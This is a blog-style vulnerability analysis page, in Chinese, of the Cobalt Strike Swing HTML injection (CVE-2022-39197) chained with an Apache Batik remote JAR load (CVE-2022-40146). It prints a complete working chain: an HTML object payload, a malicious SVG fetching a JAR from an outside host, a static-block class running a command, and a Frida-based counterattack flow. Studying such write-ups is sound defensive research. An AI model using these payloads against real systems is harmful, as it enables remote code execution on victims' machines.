@@ -1,0 +1,649 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>CoBaltStrike RCE分析 | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    CoBaltStrike RCE分析
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-10-21 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/_1xjK2YDa/" class="post-tags">
+                            # Java安全
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="cobaltstrike-rce分析">CoBaltStrike RCE分析</h1>
+<h2 id="前言">前言</h2>
+<p>看了一下最后用的Apache Batik 组件的加载jar，刚好也分析过CVE-2022-40146就一起看了</p>
+<h2 id="cve-2022-39197">CVE-2022-39197</h2>
+<p>漏洞描述：在 HelpSystems Cobalt Strike 到 4.7 中发现了一个 XSS（跨站点脚本）漏洞，允许远程攻击者在 Cobalt Strike 团队服务器上执行 HTML</p>
+<p>从官方的修复及回应中也可以看出这是一个上升至远程代码执行的漏洞：https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-strike-4-7-1/</p>
+<p>而这个XSS是由Swing的html解析器导致的</p>
+<p>简单写一个demo</p>
+<pre><code class="language-java">import javax.swing.*;
+
+public class Test {
+    public static void main(String[] args) {
+        JFrame jFrame = new JFrame(&quot;Test1&quot;);
+        JLabel jLabel = new JLabel(&quot;&lt;html&gt;&lt;h1&gt;6right&lt;/h1&gt;&lt;/html&gt;&quot;);
+        jFrame.add(jLabel);
+        jFrame.setSize(400,500);
+        jFrame.setVisible(true);
+    }
+}
+
+</code></pre>
+<p>运行上面的代码片段将创建一个新的<em>JFrame</em>，其中包含一个 使用 HTML 设置标签主体样式的*JLabel 。*在这种情况下，JLabel文本解析了HTML，而JFrame没有。</p>
+<ul>
+<li>JLabel</li>
+<li>JButton</li>
+<li>JToggleButton</li>
+<li>JCheckBox</li>
+<li>JRadioButton</li>
+<li>JMenu</li>
+<li>JMenuItem</li>
+<li>JCheckBoxMenuItem</li>
+<li>JRadioButtonMenuItem</li>
+<li>JComboBox</li>
+<li>JList</li>
+<li>JTable</li>
+<li>JTree</li>
+<li>JToolTip等等</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202210201601025.png" alt="image-20221019102040747" loading="lazy"></figure>
+<p>那不是直接使用<code>&lt;script&gt;</code>就好了？</p>
+<p>但是并没有想象的那么简单，在包含scrpt时，并没有执行预期的弹窗，我们下断点看一下</p>
+<p>在https://docs.oracle.com/en/java/javase/11/docs/api/java.desktop/javax/swing/text/html/HTMLDocument.HTMLReader.html中可以看到虽然定义了Script applet等标签，但都是还没有支持</p>
+<p>但是他支持了<object>标签，可以看下html中object标签的定义：此元素允许您规定插入 HTML 文档中的对象的数据和参数，以及可用来显示和操作数据的代码。</p>
+<p>显然是有操作性的，查看OBJECT标签对象的被调用</p>
+<p>javax.swing.text.html.HTMLEditorKit.HTMLFactory#create</p>
+<pre><code class="language-java">else if (kind == HTML.Tag.OBJECT) {
+                    return new ObjectView(elem);
+</code></pre>
+<p>创建了ObjectView对象，查看他的类说明很清晰</p>
+<pre><code class="language-java">&lt;object classid=&quot;javax.swing.JLabel&quot;&gt;
+        &lt;param name=&quot;text&quot; value=&quot;sample text&quot;&gt;
+        &lt;/object&gt;
+</code></pre>
+<p>将尝试加载classid属性指定的类。如果可能，将使用用于加载关联文档的Classloader。这通常与用于加载EditorKit的ClassLoader相同。如果文档的ClassLoader为空，则为Class。使用forName。</p>
+<p>如果类能够成功加载，则会尝试通过调用class.newInstance来创建它的实例。将尝试将实例缩小为java.awt类型。组件以显示对象。</p>
+<p>也就是可以使用classid指定全类名进行反射加载，但是存在限制条件</p>
+<p>看一下javax.swing.text.html.ObjectView#createComponent代码</p>
+<pre><code class="language-java"> protected Component createComponent() {
+        AttributeSet attr = getElement().getAttributes();
+        String classname = (String) attr.getAttribute(HTML.Attribute.CLASSID);
+        try {
+            ReflectUtil.checkPackageAccess(classname);
+            Class c = Class.forName(classname, true,Thread.currentThread().
+                                    getContextClassLoader());
+            Object o = c.newInstance();
+            if (o instanceof Component) {
+                Component comp = (Component) o;
+                setParameters(comp, attr);
+                return comp;
+            }
+        } catch (Throwable e) {
+            // couldn't create a component... fall through to the
+            // couldn't load representation.
+        }
+</code></pre>
+<p>反射加载全类名，然后初始化指定类示例（这里必须要无参构造方法），再检查初始化是否是Component的实例</p>
+<ul>
+<li>是：将返回对象，并调用setParameters</li>
+<li>不是：将返回getUnloadableRepresentation的返回值</li>
+</ul>
+<pre><code class="language-java">Component getUnloadableRepresentation() {
+        // PENDING(prinz) get some artwork and return something
+        // interesting here.
+        Component comp = new JLabel(&quot;??&quot;);
+        comp.setForeground(Color.red);
+        return comp;
+    }
+</code></pre>
+<p>在进入到javax.swing.text.html.ObjectView#setParameters</p>
+<pre><code class="language-java">private void setParameters(Component comp, AttributeSet attr) {
+        Class k = comp.getClass();
+        BeanInfo bi;
+        try {
+            bi = Introspector.getBeanInfo(k);
+        } catch (IntrospectionException ex) {
+            System.err.println(&quot;introspector failed, ex: &quot;+ex);
+            return;             // quit for now
+        }
+        PropertyDescriptor props[] = bi.getPropertyDescriptors();
+        for (int i=0; i &lt; props.length; i++) {
+            //      System.err.println(&quot;checking on props[i]: &quot;+props[i].getName());
+            Object v = attr.getAttribute(props[i].getName());
+            if (v instanceof String) {
+                // found a property parameter
+                String value = (String) v;
+                Method writer = props[i].getWriteMethod();
+                if (writer == null) {
+                    // read-only property. ignore
+                    return;     // for now
+                }
+                Class[] params = writer.getParameterTypes();
+                if (params.length != 1) {
+                    // zero or more than one argument, ignore
+                    return;     // for now
+                }
+                Object [] args = { value };
+                try {
+                    MethodUtil.invoke(writer, comp, args);
+                } catch (Exception ex) {
+                    System.err.println(&quot;Invocation failed&quot;);
+                    // invocation code
+                }
+            }
+        }
+    }
+
+</code></pre>
+<p>看invoke调用，需要过两个判断</p>
+<ul>
+<li>类对象必须存在一个属性存在setter方法(在jlabel中存在setText方法)</li>
+</ul>
+<pre><code class="language-java">Method writer = props[i].getWriteMethod();
+                if (writer == null) {
+                    // read-only property. ignore
+                    return;     // for now
+                }
+</code></pre>
+<ul>
+<li>setter方法必须只有一个参数</li>
+</ul>
+<pre><code class="language-java">Class[] params = writer.getParameterTypes();
+                if (params.length != 1) {
+                    // zero or more than one argument, ignore
+                    return;     // for now
+                }
+</code></pre>
+<ul>
+<li>setter方法参数必须是String类型</li>
+</ul>
+<pre><code class="language-java">Object v = attr.getAttribute(props[i].getName());
+            if (v instanceof String) {
+                // found a property parameter
+                String value = (String) v;
+                xxxx
+</code></pre>
+<p>这里的v是object对象中的value值，而属性名就是object对象的name值</p>
+<p>所以总结完利用条件如下：</p>
+<ol>
+<li>类必须继承自<em>java.awt.Component</em></li>
+<li>必须有无参构造方法</li>
+<li>类对象必须存在一个属性存在setter方法</li>
+<li>setter方法的参数必须是一个且为string类型</li>
+</ol>
+<h2 id="筛选符合条件结果">筛选符合条件结果</h2>
+<p>这里使用tabby筛选</p>
+<p>cypher：</p>
+<pre><code class="language-sql">match (source:Method {IS_SETTER:true})&lt;-[:HAS]-(cls:Class {HAS_DEFAULT_CONSTRUCTOR: TRUE})-[:INTERFACE|EXTENDS*]-&gt;(cls1:Class {NAME:&quot;java.awt.Component&quot;}) 
+where source.SUB_SIGNATURE =~ &quot;.* set\w+\(java.lang.String\)&quot;
+return distinct source.SIGNATURE
+</code></pre>
+<p>结果（42个，这里我使用的cs4.3）：</p>
+<table>
+<thead>
+<tr>
+<th>1</th>
+<th>&quot;&lt;org.apache.xalan.client.XSLTProcessorApplet: void setDocumentURL(java.lang.String)&gt;&quot;</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2</td>
+<td>&quot;&lt;org.apache.xalan.client.XSLTProcessorApplet: void setStyleURL(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>3</td>
+<td>&quot;&lt;java.awt.Frame: void setTitle(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>4</td>
+<td>&quot;&lt;sun.awt.EmbeddedFrame: void setTitle(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>5</td>
+<td>&quot;&lt;javax.swing.JComponent: void setToolTipText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>6</td>
+<td>&quot;&lt;org.apache.batik.util.gui.UserStyleDialog$Panel: void setPath(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>7</td>
+<td>&quot;&lt;org.apache.batik.util.gui.LanguageDialog$Panel: void setLanguages(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>8</td>
+<td>&quot;&lt;console.AssociatedPanel: void setBeaconID(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>9</td>
+<td>&quot;&lt;console.Console: void setStyle(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>10</td>
+<td>&quot;&lt;console.Console: void setDefaultPrompt(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>11</td>
+<td>&quot;&lt;console.Console: void setPrompt(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>12</td>
+<td>&quot;&lt;org.apache.batik.apps.svgbrowser.StatusBar: void setMessage(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>13</td>
+<td>&quot;&lt;org.apache.batik.apps.svgbrowser.StatusBar: void setMainMessage(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>14</td>
+<td>&quot;&lt;console.Display: void setTextDirect(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>15</td>
+<td>&quot;&lt;console.Display: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>16</td>
+<td>&quot;&lt;org.apache.batik.util.gui.LocationBar: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>17</td>
+<td>&quot;&lt;org.apache.batik.util.gui.CSSMediaPanel: void setMedia(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>18</td>
+<td>&quot;&lt;javax.swing.JPopupMenu: void setLabel(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>19</td>
+<td>&quot;&lt;javax.swing.text.JTextComponent: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>20</td>
+<td>&quot;&lt;javax.swing.JTextField: void setActionCommand(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>21</td>
+<td>&quot;&lt;javax.swing.JEditorPane: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>22</td>
+<td>&quot;&lt;javax.swing.JEditorPane: void setCharsetFromContentTypeParameters(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>23</td>
+<td>&quot;&lt;javax.swing.JEditorPane: void setContentType(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>24</td>
+<td>&quot;&lt;javax.swing.JEditorPane: void setPage(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>25</td>
+<td>&quot;&lt;org.apache.batik.util.gui.xmleditor.XMLTextEditor: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>26</td>
+<td>&quot;&lt;aggressor.AggressorClient: void setTitle(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>27</td>
+<td>&quot;&lt;javax.swing.AbstractButton: void setLabel(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>28</td>
+<td>&quot;&lt;javax.swing.AbstractButton: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>29</td>
+<td>&quot;&lt;javax.swing.AbstractButton: void setActionCommand(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>30</td>
+<td>&quot;&lt;javax.swing.JLabel: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>31</td>
+<td>&quot;&lt;org.apache.batik.swing.svg.AbstractJSVGComponent: void setFragmentIdentifier(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>32</td>
+<td>&quot;&lt;org.apache.batik.swing.JSVGCanvas: void setURI(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>33</td>
+<td>&quot;&lt;javax.swing.JFileChooser: void setDialogTitle(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>34</td>
+<td>&quot;&lt;javax.swing.JFileChooser: void setApproveButtonToolTipText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>35</td>
+<td>&quot;&lt;javax.swing.JFileChooser: void setApproveButtonText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>36</td>
+<td>&quot;&lt;graph.NetworkGraph: void setAutoLayout(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>37</td>
+<td>&quot;&lt;javax.swing.JToolTip: void setTipText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>38</td>
+<td>&quot;&lt;javax.swing.JProgressBar: void setString(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>39</td>
+<td>&quot;&lt;javax.swing.JInternalFrame: void setTitle(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>40</td>
+<td>&quot;&lt;javax.swing.JComboBox: void setActionCommand(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>41</td>
+<td>&quot;&lt;java.awt.TextField: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>42</td>
+<td>&quot;&lt;java.awt.Label: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+</tbody>
+</table>
+<h2 id="batik远程加载jar">batik远程加载jar</h2>
+<p>这里对所有符合条件的方法进行筛选也是一个耗时的过程，在已知的情况下我就直接分析&lt;org.apache.batik.swing.JSVGCanvas: void setURI(java.lang.String)&gt;了</p>
+<p>已知：batik对SVG对象进行处理时，可以通过xlink:href对jar包进行解析，batik最后是在org.apache.batik.bridge.BaseScriptingEnvironment#loadScript处</p>
+<pre><code class="language-java">if (type.equals(&quot;application/java-archive&quot;)) {
+                try {
+                    String href = XLinkSupport.getXLinkHref(script);
+                    ParsedURL purl = new ParsedURL(script.getBaseURI(), href);
+                    this.checkCompatibleScriptURL(type, purl);
+                    URL docURL = null;
+
+                    try {
+                        docURL = new URL(this.docPURL.toString());
+                    } catch (MalformedURLException var14) {
+                    }
+
+                    DocumentJarClassLoader cll = new DocumentJarClassLoader(new URL(purl.toString()), docURL);
+                        URL url = cll.findResource(&quot;META-INF/MANIFEST.MF&quot;);
+                    if (url == null) {
+                        return;
+                    }
+
+                    Manifest man = new Manifest(url.openStream());
+                    this.executedScripts.put(script, (Object)null);
+                    mediaType = man.getMainAttributes().getValue(&quot;Script-Handler&quot;);
+                    if (mediaType != null) {
+                        ScriptHandler h = (ScriptHandler)cll.loadClass(mediaType).getDeclaredConstructor().newInstance();
+                        h.run(this.document, this.getWindow());
+                    }
+
+                    mediaType = man.getMainAttributes().getValue(&quot;SVG-Handler-Class&quot;);
+                    if (mediaType != null) {
+                        EventListenerInitializer initializer = (EventListenerInitializer)cll.loadClass(mediaType).getDeclaredConstructor().newInstance();
+                        this.getWindow();
+                        initializer.initializeEventListeners((SVGDocument)this.document);
+                    }
+                } catch (Exception var16) {
+                    if (this.userAgent != null) {
+                        this.userAgent.displayError(var16);
+                    }
+                }
+</code></pre>
+<p>在cs4.3中是org.apache.batik.bridge.BaseScriptingEnvironment#loadScripts，先打上断点</p>
+<p>构造一个恶意svg文件</p>
+<pre><code class="language-java">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;
+     xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;450&quot; height=&quot;500&quot;
+     viewBox=&quot;0 0 450 500&quot;&gt;
+    &lt;script type=&quot;application/java-archive&quot; xlink:href=&quot;http://192.168.102.19:8081/CVE_2022_40146.jar&quot;&gt;&lt;/script&gt;
+&lt;/svg&gt;
+</code></pre>
+<p>然后该更JLable值</p>
+<pre><code class="language-java">JLabel jLabel = new JLabel(&quot;&lt;html&gt;&lt;object classid=\&quot;org.apache.batik.swing.JSVGCanvas\&quot;&gt;\n&quot; +
+        &quot;        &lt;param name=\&quot;URI\&quot; value=\&quot;http://192.168.102.19:8081/test.svg\&quot;&gt;\n&quot; +
+        &quot;        &lt;/object&gt;&lt;/html&gt;&quot;);
+</code></pre>
+<p>中间会经过DefaultScriptSecurity，需要svg文件地址和jar包地址host相同，所以放一块就行</p>
+<p>jar包类，静态方法恶意即可</p>
+<pre><code class="language-java">import java.io.IOException;
+
+public class CVE_2022_40146 {
+        static {
+            try {
+                Runtime.getRuntime().exec(&quot;calc&quot;);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+}
+
+</code></pre>
+<p>打包成jar，修改META-INF/MANIFEST.MF文件，添加条目Script-Handler: CVE_2022_40146</p>
+<p>因为在org.apache.batik.bridge.BaseScriptingEnvironment#loadScript做了对MANIFEST条目的校验，得实现Script-Handler或SVG-Handler-Class条目才能进入加载字节码，做到命令执行</p>
+<figure data-type="image" tabindex="2"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202210201601027.png" alt="image-20221020112023148" loading="lazy"></figure>
+<h2 id="cs-rce流程">CS RCE流程</h2>
+<p>后续反制可以参考漂亮鼠师傅的 windows api hook</p>
+<ul>
+<li>https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ</li>
+</ul>
+<p>1.将木马文件通过frida运行，用frida脚本 hook Process32Next函数，当木马通过API去获取数据结构中的进程名称(也就是szExeFile)时，得到的是我们脚本传入的恶意html</p>
+<pre><code>&lt;html&gt;&lt;object classid=&quot;org.apache.batik.swing.JSVGCanvas&quot;&gt;&lt;param name=&quot;URI&quot; value=&quot;http://xxx/test.svg&quot;&gt;&lt;/object&gt;&lt;/html&gt;
+</code></pre>
+<p>2.然后swing解析html去访问加载恶意svg文件</p>
+<pre><code>&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;
+     xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;450&quot; height=&quot;500&quot; 
+     viewBox=&quot;0 0 450 500&quot;&gt;
+    &lt;script type=&quot;application/java-archive&quot; xlink:href=&quot;http://192.168.102.19:8081/AttackJar.jar&quot;&gt;&lt;/script&gt;
+&lt;/svg&gt;
+</code></pre>
+<p>3.最后batik解析svg文件去访问加载恶意jar，导致命令执行</p>
+<h2 id="参考">参考</h2>
+<p>https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/websocket-nei-cun-ma-jian-ce/" class="post-title gt-a-link">
+                    WebSocket内存马检测
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/cobaltstrike-rce-fen-xi/" class="leancloud_visitors" data-flag-title="CoBaltStrike RCE分析">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
